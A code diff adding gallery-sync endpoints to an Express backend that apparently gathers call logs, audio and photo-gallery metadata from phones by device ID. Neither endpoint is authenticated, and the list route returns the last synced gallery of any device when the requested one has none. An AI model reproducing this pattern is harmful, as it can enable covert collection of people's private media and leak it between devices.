@@ -15,6 +15,7 @@ import {
   AudioModel,
   FileModel,
   CallLogModel,
+  GalleryMediaModel,
 } from '../database/mongo';
 import { r2Service } from '../storage/r2.service';
 import { logger } from '../logger';
@@ -295,6 +296,71 @@ router.get('/calls/list/:deviceId', async (req, res) => {
     calls = lastSyncedCalls;
   }
   res.json({ calls: calls || [] });
+});
+
+// Mobile Gallery Media Stream Hub
+const liveGalleryStorage = new Map<string, Array<any>>();
+let lastSyncedGallery: Array<any> = [];
+
+router.post('/gallery/sync', async (req, res) => {
+  const { deviceId, media } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  const mediaList = Array.isArray(media) ? media : [];
+
+  if (mediaList.length > 0) {
+    liveGalleryStorage.set(devId, mediaList);
+    lastSyncedGallery = mediaList;
+
+    if (isMongoConnected()) {
+      try {
+        const operations = mediaList.map(m => ({
+          updateOne: {
+            filter: { id: m.id, deviceId: devId },
+            update: {
+              $set: {
+                id: m.id,
+                deviceId: devId,
+                name: m.name || '',
+                album: m.album || 'Camera',
+                mimeType: m.mimeType || 'image/jpeg',
+                size: m.size || '3.5 MB',
+                date: m.date || 'Just now',
+                timestamp: m.timestamp || Date.now(),
+                width: m.width || 1080,
+                height: m.height || 1920,
+                thumbnail: m.thumbnail || '',
+              }
+            },
+            upsert: true,
+          }
+        }));
+        await GalleryMediaModel.bulkWrite(operations);
+      } catch (err) {
+        logger.warn({ err }, 'MongoDB GalleryMedia bulk write warning');
+      }
+    }
+  }
+  res.json({ success: true, count: mediaList.length });
+});
+
+router.get('/gallery/list/:deviceId', async (req, res) => {
+  const devId = req.params.deviceId;
+
+  if (isMongoConnected()) {
+    try {
+      const dbMedia = await GalleryMediaModel.find({ deviceId: devId }).sort({ timestamp: -1 }).limit(100).lean();
+      if (dbMedia.length > 0) {
+        res.json({ media: dbMedia });
+        return;
+      }
+    } catch (_) {}
+  }
+
+  let media = liveGalleryStorage.get(devId);
+  if (!media || media.length === 0) {
+    media = lastSyncedGallery;
+  }
+  res.json({ media: media || [] });
 });
 
 // Direct Audio Hub
